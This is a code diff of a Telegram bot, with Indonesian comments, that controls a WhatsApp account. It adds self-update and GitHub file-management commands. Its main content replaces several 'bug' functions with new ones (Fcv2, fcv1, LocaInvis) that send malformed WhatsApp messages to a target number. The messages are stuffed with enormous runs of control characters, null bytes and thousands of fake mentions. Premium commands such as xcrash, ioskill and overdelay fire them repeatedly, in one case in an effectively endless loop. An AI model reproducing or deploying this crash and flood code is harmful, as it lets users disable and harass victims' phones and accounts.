@@ -1164,6 +1164,270 @@ bot.command("deladmin", async (ctx) => {
     }
 });
 
+const fsp = fs.promises;
+// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
+function loadUpdateConfig() {
+  try {
+    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
+    const cfgPath = path.join(process.cwd(), "update.js");
+
+    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
+    try {
+      delete require.cache[require.resolve(cfgPath)];
+    } catch (_) {}
+
+    const cfg = require(cfgPath);
+    return (cfg && typeof cfg === "object") ? cfg : {};
+  } catch (e) {
+    return {};
+  }
+}
+
+const UPD = loadUpdateConfig();
+
+// ====== CONFIG ======
+const GITHUB_OWNER = UPD.github_owner || "name gh";
+const DEFAULT_REPO = UPD.github_repo_default || "name repo";
+const GITHUB_BRANCH = UPD.github_branch || "main";
+const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";
+
+// token untuk WRITE (add/del)
+const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";
+
+// target lokal yang bakal diganti oleh /update
+const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");
+
+// ================== FETCH HELPER ==================
+const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));
+
+// ================== FILE WRITE ATOMIC ==================
+async function atomicWriteFile(targetPath, content) {
+  const dir = path.dirname(targetPath);
+  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
+  await fsp.writeFile(tmp, content, { encoding: "utf8" });
+  await fsp.rename(tmp, targetPath);
+}
+
+// ================== READ (PUBLIC): DOWNLOAD RAW ==================
+async function ghDownloadRawPublic(repo, filePath) {
+  const rawUrl =
+    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
+    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;
+
+  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });
+
+  if (!res.ok) {
+    const txt = await res.text().catch(() => "");
+    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
+  }
+  return await res.text();
+}
+
+// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
+function mustWriteToken() {
+  if (!GITHUB_TOKEN_WRITE) {
+    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
+  }
+}
+
+function ghWriteHeaders() {
+  mustWriteToken();
+  return {
+    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
+    Accept: "application/vnd.github+json",
+    "X-GitHub-Api-Version": "2022-11-28",
+    "User-Agent": "telegraf-gh-writer",
+  };
+}
+
+async function ghGetContentWrite(repo, filePath) {
+  const url =
+    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
+    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;
+
+  const res = await fetchFn(url, { headers: ghWriteHeaders() });
+
+  if (!res.ok) {
+    const txt = await res.text().catch(() => "");
+    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
+  }
+  return res.json();
+}
+
+async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
+  let sha;
+  try {
+    const existing = await ghGetContentWrite(repo, filePath);
+    sha = existing?.sha;
+  } catch (e) {
+    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
+  }
+
+  const url =
+    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
+    `/contents/${encodeURIComponent(filePath)}`;
+
+  const body = {
+    message: commitMsg,
+    content: Buffer.from(contentText, "utf8").toString("base64"),
+    branch: GITHUB_BRANCH,
+    ...(sha ? { sha } : {}),
+  };
+
+  const res = await fetchFn(url, {
+    method: "PUT",
+    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+
+  if (!res.ok) {
+    const txt = await res.text().catch(() => "");
+    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
+  }
+
+  return res.json();
+}
+
+async function ghDeleteFileWrite(repo, filePath, commitMsg) {
+  const info = await ghGetContentWrite(repo, filePath);
+  const sha = info?.sha;
+  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");
+
+  const url =
+    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
+    `/contents/${encodeURIComponent(filePath)}`;
+
+  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };
+
+  const res = await fetchFn(url, {
+    method: "DELETE",
+    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+
+  if (!res.ok) {
+    const txt = await res.text().catch(() => "");
+    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
+  }
+
+  return res.json();
+}
+
+// ================== COMMANDS ==================
+
+// /update [repoOptional]
+// download update_index.js -> replace local index.js -> restart
+bot.command("autoupdate", async (ctx) => {
+  try {
+    const parts = (ctx.message.text || "").trim().split(/\s+/);
+    const repo = parts[1] || DEFAULT_REPO;
+
+    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
+    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });
+
+    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);
+
+    if (!newCode || newCode.trim().length < 50) {
+      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
+    }
+
+    // backup index.js lama
+    try {
+      const backup = path.join(process.cwd(), "index.backup.js");
+      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
+    } catch (_) {}
+
+    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);
+
+    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");
+
+    setTimeout(() => process.exit(0), 3000);
+  } catch (err) {
+    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
+  }
+});
+
+// /addfiles <repo> (reply file .js)
+bot.command("addfile", async (ctx) => {
+  try {
+    const parts = (ctx.message.text || "").trim().split(/\s+/);
+    const repo = parts[1] || DEFAULT_REPO;
+
+    const replied = ctx.message.reply_to_message;
+    const doc = replied?.document;
+
+    if (!doc) {
+      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
+    }
+
+    const fileName = doc.file_name || "file.js";
+    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");
+
+    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });
+
+    const link = await ctx.telegram.getFileLink(doc.file_id);
+    const res = await fetchFn(link.href);
+    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);
+
+    const contentText = await res.text();
+
+    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);
+
+    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
+  } catch (err) {
+    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
+  }
+});
+
+// /delfiles <repo> <path/file.js>
+bot.command("dellfile", async (ctx) => {
+  try {
+    const parts = (ctx.message.text || "").trim().split(/\s+/);
+    const repo = parts[1] || DEFAULT_REPO;
+    const file = parts[2];
+
+    if (!file) {
+      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
+    }
+
+    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });
+
+    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);
+
+    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
+  } catch (err) {
+    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
+  }
+});
+  
+// ====== /restart ======
+bot.command("restart", async (ctx) => {
+  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");
+
+  // kirim status ke grup utama kalau ada
+  try {
+    if (typeof sendToGroupsUtama === "function") {
+      sendToGroupsUtama(
+        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
+        { parse_mode: "Markdown" }
+      );
+    }
+  } catch (e) {}
+
+  setTimeout(() => {
+    try {
+      if (typeof sendToGroupsUtama === "function") {
+        sendToGroupsUtama(
+          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
+          { parse_mode: "Markdown" }
+        );
+      }
+    } catch (e) {}
+  }, 8000);
+
+  setTimeout(() => process.exit(0), 5000);
+});
+
 bot.command('addprem', async (ctx) => {    
     const senderId = ctx.from.id.toString()
 
@@ -1638,7 +1902,7 @@ bot.command("overdelay", checkWhatsAppConnection, checkPremium, checkCooldown, a
   }
 
   for (let i = 0; i < 1000000000000000; i++) {
-    await delayFX(sock, target);
+    await LocaInvis(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -1772,7 +2036,7 @@ bot.command("xdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async
   }
 
   for (let i = 0; i < 1000000000000000; i++) {
-    await delayFX(sock, target);
+    await LocaInvis(sock, target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -1905,8 +2169,8 @@ bot.command("xpler", checkWhatsAppConnection, checkPremium, checkCooldown, async
     );
   }
 
-  for (let i = 0; i < 1; i++) {
-    await Crashhome(target);
+  for (let i = 0; i < 50; i++) {
+    await fcv1(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -1973,7 +2237,7 @@ bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, as
   }
 
   for (let i = 0; i < 50; i++) {
-    await Crashhome(target);
+    await fcv1(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2040,7 +2304,7 @@ bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   }
 
   for (let i = 0; i < 65; i++) {
-    await spamnotifvirtex(sock, target);
+    await Fcv2(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2107,7 +2371,7 @@ bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, asy
   }
 
   for (let i = 0; i < 100; i++) {
-    await CrashXios(sock, target);
+    await Fcv2(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -2174,7 +2438,7 @@ bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   }
 
   for (let i = 0; i < 50; i++) {
-    await crashstiker(target);
+    await fcv1(target);
   }
 
   await ctx.telegram.editMessageCaption(
@@ -3541,133 +3805,87 @@ bot.command("play", async (ctx) => {
 });
 
 // The Function Bugs
-async function spamnotifvirtex(sock, target) {
-  const msg = {
-    groupMentionedMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            hasMediaAttachment: true,
-            documentMessage: {
-              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
-              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
-              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-              fileLength: "999999999",
-              pageCount: 9999999999,
-              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-              fileName: "MAKLOE",
-              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-              directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
-              mediaKeyTimestamp: "1715880173",
-              contactVcard: false
+async function Fcv2(target) {
+  try {
+    const bangka = {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            ephemeralMessage: {
+              sendPaymentMessage: {
+                extendedTextMessage: {
+                  text: "VISIBLE",
+                  matchedText: "https://t.me/wolkerdev",
+                  description: "🩸⃟༑⌁⃰Abimm⿻𝐂𝐑𝐀𝐒𝐇ཀ🦠️",
+                  title: "𐎟 𝐖𝐎𝐋𝐊𝐄𝐑 ⿻ 𝐂𝐑𝐀𝐒𝐇 𐎟",
+                },
+                paymentLinkMetadata: {
+                  LinkPrevieMetadata: {
+                    button: { displayText: "F" },
+                    name: "address_message",
+                    paramsJson: "\x10".repeat(100000),
+                  },
+                },
+                contextInfo: {
+                  socialMediaPostType: 9999,
+                  linkMediaDuration: 999,
+                  urlMetadata: { fbExperimentId: 999 },
+                  fbExperimentId: 999,
+                },
+              },
+              version: 3,
             },
-            title: "bungs wangcap"
           },
-          body: {
-            text: "aKu bUg kaMu y"
-          },
-          nativeFlowMessage: {
-            buttons: []
-          },
-          contextInfo: {
-            mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
-            groupMentions: [{ 
-              groupJid: "0@g.us", 
-              groupSubject: "klz bg" 
-            }]
-          }
-        }
-      }
-    }
-  };
+        },
+      },
+    };
 
-  await sock.relayMessage(target, msg, { 
-    messageId: Date.now().toString(),
-    participant: { jid: target }
-  });
+    await sock.relayMessage(target, bangka, {
+      participant: { jid: target },
+      messageId: null,
+    });
+
+  } catch (err) {
+    console.error("Fcv2 Error:", err);
+  }
 }
 
-async function crashstiker(target) {
-  const delay = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          nativeFlowResponseMessage: {
-            header: {
-              hasMediaAttachment: true,
-              documentMessage: {
-                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
-                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
-                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-                fileLength: "999999999",
-                pageCount: 9999999999,
-                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-                fileName: "MAKLOE",
-                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
-                mediaKeyTimestamp: "1715880173",
-                contactVcard: false
-              }
-            },
-
-            StatusAttributionType: 1,
-            forwardedAiBotMessageInfo: {
-              botName: "Meta",
-              botJid: "13135550002@s.whatsapp.net",
-              creatorName: "abim Is here"
-            },
-            externalAdReply: {
-              showAdAttribution: false,
-              renderLargerThumbnail: true
-            },
-            quotedMessage: {
-              paymentInviteMessage: {
-                serviceType: 1,
-                expiryTimestamp: null
-              }
-            },
-
-            body: {
-              text: "ꦾ".repeat(12000) + "ោ៝".repeat(25000)
-            },
-
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "single_select",
-                  buttonParamsJson: ""
-                },
-                {
-                  name: "cta_call",
-                  buttonParamsJson: JSON.stringify({
-                    display_text: "ꦽ".repeat(150000),
-                    thumbnailHeight: 480,
-                    thumbnailWidth: 339,
-                    caption: "ꦾ".repeat(15000),
-                    forwardedNewsletterMessageInfo: {
-                      newsletterJid: "0@newsletter",
-                      newsletterName: "ꦾ".repeat(50000)
-                    },
-                    nativeFlowResponseMessage: {
-                      name: "galaxy_message",
-                      paramsJson: "\r".repeat(25000),
-                      version: 3
-                    }
-                  })
-                }
-              ]
+async function fcv1(target) {
+  try {
+    const messageContent = {
+      viewOnceMessage: {
+        message: {
+          extendedTextMessage: {
+            text: "VISIBLEV1",
+            matchedText: "https://t.me/wolkerdev",
+            description: "🩸⃟༑⌁⃰Abimm⿻𝐂𝐑𝐀𝐒𝐇ཀ🦠️",
+            title: "𐎟 𝐖𝐎𝐋𝐊𝐄𝐑 ⿻ 𝐂𝐑𝐀𝐒𝐇 𐎟",
+            contextInfo: {
+              socialMediaPostType: 9999,
+              linkMediaDuration: 999,
+              urlMetadata: { fbExperimentId: 999 },
+              fbExperimentId: 999,
             }
           }
         }
       }
-    }
-  };
+    };
 
-  await sock.relayMessage(target, delay.viewOnceMessage, {
-    messageId: sock.generateMessageTag()
-  });
+    const msg = generateWAMessageFromContent(
+      target,
+      messageContent,
+      { userJid: sock.user.id }
+    );
 
-  console.log(`send to ${target}`);
+    await sock.relayMessage(
+      target,
+      msg.message,
+      { messageId: msg.key.id }
+    );
+
+  } catch (err) {
+    console.error("fcv1 Error:", err);
+  }
 }
 
 async function JayaBlank(target) {
@@ -3753,92 +3971,69 @@ async function CrashXios(sock, target) {
   console.log("Invisble Function Bugger");
 } 
 
-async function delayFX(sock, target) {
-  console.log(chalk.red(`SENDING BUG`));
-
-  const akhjx = proto.Message.fromObject({
-    viewOnceMessage: {
+async function LocaInvis(sock, target) {
+  console.log(chalk.red("DelayBy Zunn"));
+  
+  const Invis = generateWAMessageFromContent(target, {
+    viewOnceMessageV2: {
       message: {
-        interactiveMessage: {
-          header: {
-            locationMessage: {
-              degreesLatitude: -999.03499999999999,
-              degreesLongitude: 922.9999999999999,
-              name: "Fuck Kill" + "Ovalium Ghost".repeat(40000),
-              url: "https://t.me/Xwarrxxx",
-              contextInfo: {
-                externalAdReply: {
-                  quotedAd: {
-                    advertiserName: "FUCKKKK".repeat(40000),
-                    mediaType: "IMAGE",
-                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
-                    caption: "οταϰ ιѕ нєяє"
-                  },
-                  placeholderKey: {
-                    remoteJid: "0@g.us",
-                    fromMe: true,
-                    id: "ABCDEF1234567890"
-                  }
-                }
+        locationMessage: {
+          degreesLatitude: 0,
+          degreesLongitude: -0,
+          name: "LOCA",
+          url: "https://t.me/zunncrash",
+          contextInfo: {
+            mentionedJid: [
+              target,
+              ...Array.from({ length: 1900 }, () => 
+                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+              )
+            ],
+            isSampled: true,
+            participant: target,
+            remoteJid: "status@broadcast",
+            forwardingScore: 999999,
+            isForwarded: true,
+            quotedMessage: {
+              extendedTextMessage: {
+                text: "\u0000".repeat(100000)
               }
             },
-            hasMediaAttachment: true
-          },
-          body: {
-            text: "HELLO"
-          },
-          nativeFlowMessage: {
-            messageParamsJson: "{[",
-            messageVersion: 3,
-            buttons: [
-              {
-                name: "single_select",
-                buttonParamsJson: ""
-              },
-              {
-                name: "galaxy_message",
-                buttonParamsJson: JSON.stringify({
-                  icon: "RIVIEW",
-                  flow_cta: "ꦽ".repeat(10000),
-                  flow_message_version: "3"
-                })
-              },
-              {
-                name: "galaxy_message",
-                buttonParamsJson: JSON.stringify({
-                  icon: "RIVIEW",
-                  flow_cta: "ꦾ".repeat(10000),
-                  flow_message_version: "3"
-                })
-              }
-            ]
-          },
-          quotedMessage: {
-            interactiveResponseMessage: {
-              nativeFlowResponseMessage: {
-                version: 3,
-                name: "call_permission_request",
-                paramsJson: "\u0000".repeat(1045000)
-              },
-              body: {
-                text: "KILL YOU",
-                format: "DEFAULT"
-              }
+            externalAdReply: {
+              advertiserName: "DOCUMAND",
+              title: "SEMESTA - DELAY",
+              body: "DELAY SANGAT",
+              mediaType: 1,
+              renderLargerThumbnail: true,
+              thumbnailUrl: null,
+              sourceUrl: "https://example.com"
+            },
+            placeholderKey: {
+              remoteJid: "0@s.whatsapp.net",
+              fromMe: false,
+              id: "ABCDEF1234567890"
             }
           }
         }
       }
     }
-  });
+  }, {});
 
-  const statusJid = "status@broadcast";
-  const msg = await generateWAMessageFromContent(statusJid, akhjx, { 
-    userJid: sock.user.id 
-  });
-  
-  await sock.relayMessage(statusJid, msg.message, { 
-    messageId: msg.key.id 
-  });
+  for (const msg of [Invis]) {
+    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
+      messageId: msg.key?.id || undefined,
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{ tag: "to", attrs: { jid: target } }]
+        }]
+      }]
+    });
+  }
 }
 
 async function Crashhome(target) {
